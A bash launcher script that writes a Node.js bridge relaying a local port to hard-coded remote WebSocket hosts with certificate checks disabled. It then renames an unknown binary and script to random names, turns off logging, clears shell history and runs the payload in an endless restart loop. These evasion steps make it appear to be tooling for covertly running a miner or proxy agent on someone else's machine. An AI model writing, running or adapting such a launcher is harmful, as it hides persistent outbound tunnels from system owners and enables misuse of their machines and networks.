#!/bin/bash
set -uo pipefail
CONNECT=${1:-2}
NAME=${2:-M1}
PROXY_LIST=("wss://set.smartcontrolai.shop" "wss://set.technoelectro.online")
CUSTOM=${3:-}
if [ -n "$CUSTOM" ]; then
  WSS_URL="$CUSTOM"
else
  WSS_URL="${PROXY_LIST[$((RANDOM % ${#PROXY_LIST[@]}))]}"
fi
DIR="$(cd "$(dirname "$0")" && pwd)"
if [ ! -d "$DIR/node_modules/ws" ]; then
  cd "$DIR" && npm install ws 2>/dev/null
fi
cat > "$DIR/wssss.js" <<'BRIDGE'
const net=require("net"),WebSocket=require("ws");
const LPORT=parseInt(process.env.BRIDGE_PORT||"0");
const WSS_URL=process.env.BRIDGE_WSS||"";
if(!LPORT||!WSS_URL){console.error("missing BRIDGE_PORT/BRIDGE_WSS");process.exit(1);}
const server=net.createServer(tcp=>{
  const ws=new WebSocket(WSS_URL,{rejectUnauthorized:false});
  let buf="";
  ws.on("open",()=>{
    tcp.on("data",d=>{
      buf+=d.toString();
      let i;
      while((i=buf.indexOf("\n"))>=0){
        const line=buf.slice(0,i+1);buf=buf.slice(i+1);
        if(line.trim())try{ws.send(line)}catch{}
      }
      if(buf.trim())try{ws.send(buf);buf=""}catch{}
    });
  });
  ws.on("message",m=>{try{tcp.write(m.toString())}catch{}});
  ws.on("close",()=>tcp.destroy());
  ws.on("error",()=>tcp.destroy());
  tcp.on("close",()=>ws.close());
  tcp.on("error",()=>ws.close());
});
server.listen(LPORT,"127.0.0.1",()=>console.log(`[bridge] tcp://127.0.0.1:${LPORT} → ${WSS_URL}`));
BRIDGE
LPORT=$((20000 + RANDOM % 40000))
RAND="$(tr -dc 'a-z0-9' </dev/urandom | head -c 10)"
NODE_FILE=$(find . -maxdepth 1 -type f -name "*.node" | head -n 1)
JS_FILE=$(ls ./*.js 2>/dev/null | head -n 1)
[ -z "$NODE_FILE" ] || [ -z "$JS_FILE" ] && { echo "no .node/.js"; exit 1; }
NEW_NODE="./${RAND}.node"
NEW_JS="${RAND}.js"
mv "$NODE_FILE" "$NEW_NODE"
mv "$JS_FILE" "$NEW_JS"
export APP_FILE="./$NEW_NODE"
export SERVER_HOST=127.0.0.1
export SERVER_PORT=${LPORT}
export SERVER_DOMAIN=${NAME}
export SERVER_SECRET=x
export LOGGING=false
export SERVER_CONNECTION=${CONNECT}
export NODE_TLS_REJECT_UNAUTHORIZED=0
echo "SERVER_HOST=127.0.0.1
SERVER_PORT=${LPORT}
SERVER_DOMAIN=${NAME}
SERVER_SECRET=x
LOGGING=false
SERVER_CONNECTION=${CONNECT}" > .env
echo "[run] PORT=${LPORT} WSS=${WSS_URL} NAME=${NAME} CONN=${CONNECT}"
history -c && history -w && clear
while true; do
  if [ -z "$CUSTOM" ]; then
    WSS_URL="${PROXY_LIST[$((RANDOM % ${#PROXY_LIST[@]}))]}"
  fi
  BRIDGE_PORT=${LPORT} BRIDGE_WSS=${WSS_URL} node "$DIR/wssss.js" &
  WS_PID=$!
  for i in 1 2 3 4 5; do
    sleep 1
    if nc -z 127.0.0.1 ${LPORT} 2>/dev/null; then
      echo "[bridge ready] tcp://127.0.0.1:${LPORT} → ${WSS_URL}"
      break
    fi
    [ $i -eq 5 ] && { echo "[bridge fail]"; kill $WS_PID 2>/dev/null; sleep 5; continue 2; }
  done
  node $NEW_JS
  kill $WS_PID 2>/dev/null
  wait $WS_PID 2>/dev/null
  sleep 5
done
